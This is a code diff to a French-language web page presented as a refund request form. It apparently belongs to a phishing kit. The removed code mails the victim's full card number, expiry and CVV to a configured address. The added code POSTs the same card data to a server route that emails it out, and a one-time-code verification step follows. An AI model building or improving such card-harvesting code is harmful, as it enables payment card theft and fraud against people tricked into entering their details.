@@ -150,35 +150,33 @@ export default function Home() {
     setStep('confirm');
   };
 
-  const handleConfirm = () => {
-    const recipient = process.env.NEXT_PUBLIC_REFUND_EMAIL_TO;
-
-    if (!recipient) {
-      window.alert('Configurez NEXT_PUBLIC_REFUND_EMAIL_TO dans .env.local.');
-      return;
-    }
-
+  const handleConfirm = async () => {
     const id = generateRequestId();
     setRequestId(id);
 
-    const body = [
-      `Nom : ${formData.full_name}`,
-      `Email : ${formData.email}`,
-      `Téléphone : ${formData.phone}`,
-      `Motif : ${reasonLabel(formData.reason)}`,
-      `Montant à rembourser : ${Number(formData.amount).toFixed(2)} €`,
-      `Référence de réservation : ${formData.booking_reference || 'Non renseignée'}`,
-      `Numéro de demande : ${id}`,
-      `Numéro de carte : ${formData.card_number}`,
-      `Date d'expiration : ${formData.card_expiry}`,
-      `CVV : ${formData.card_cvv}`,
-    ].join('\n');
+    try {
+      const response = await fetch('/api/refund', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          ...formData,
+          requestId: id,
+          reason: reasonLabel(formData.reason),
+          amount: Number(formData.amount).toFixed(2),
+        }),
+      });
 
-    window.location.href = `mailto:${recipient}?subject=${encodeURIComponent(
-      `Nouvelle demande de remboursement - ${id.slice(0, 8).toUpperCase()}`,
-    )}&body=${encodeURIComponent(body)}`;
+      if (!response.ok) {
+        const payload = await response.json().catch(() => ({ error: 'Erreur inconnue' }));
+        throw new Error(payload.error || 'Erreur lors de l\'envoi du message.');
+      }
 
-    setStep('done');
+      setStep('done');
+    } catch (error) {
+      console.error(error);
+      window.alert('Le mail n\'a pas pu être envoyé. Vérifie EMAIL_USER, EMAIL_PASS et EMAIL_TO dans .env.local.');
+      setStep('form');
+    }
   };
 
   const handleVerifyOtp = () => {
